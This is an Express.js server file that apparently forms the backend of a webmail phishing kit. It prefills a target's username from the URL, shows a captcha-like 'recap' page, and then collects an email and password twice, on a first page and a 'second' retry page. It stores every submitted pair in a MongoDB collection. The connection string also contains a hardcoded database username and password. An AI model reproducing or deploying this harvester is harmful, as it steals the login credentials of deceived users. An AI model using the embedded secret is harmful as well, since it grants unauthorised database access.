let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let https = require('https');
let app = express();


app.set("view engine", "ejs")

app.use(bodyParser.urlencoded({
  extended: true
}));

app.use(express.static("public"));

mongoose.set('strictQuery', true);

mongoose.connect("mongodb+srv://kdavis1759:Badhtguy1.@cluster0.mqjtsdi.mongodb.net/webmail",{
  useNewUrlParser:true
});

const userSchema = new mongoose.Schema({
  email: String,
  password: String,
});
const User = new mongoose.model("User", userSchema);

app.get('/',function(req,res){
  username = req.query.username;
  res.render('recap',{username:username})
});

app.post('/',function(req,res){
  var user = req.body.recapstore;
  res.render('index',{username:username})
});
app.get('/final',function(req,res){
  res.render('final')
});

app.get('/second',function(req,res){
  username = req.query.username;
  res.render('second',{username:username})
});

app.post('/index',function(req,res){
  const newUser = new User({
    email: req.body.email,
    password: req.body.password
  });
  newUser.save(function(err){
    if(err){
      console.log(err);
    } else {
      res.render('second',{username:username})
    }
  });
});

app.post('/second',function(req,res){
  const newUser = new User({
    email: req.body.email,
    password: req.body.password
  });
  newUser.save(function(err){
    if(err){
      console.log(err);
    } else {
      res.render('final')
    }
  });
})


let port = process.env.PORT;
if (port == null || port == "") {
  port = 3000
};

app.listen(process.env.PORT || 3000, function() {
  console.log("welcome to 3k")
});
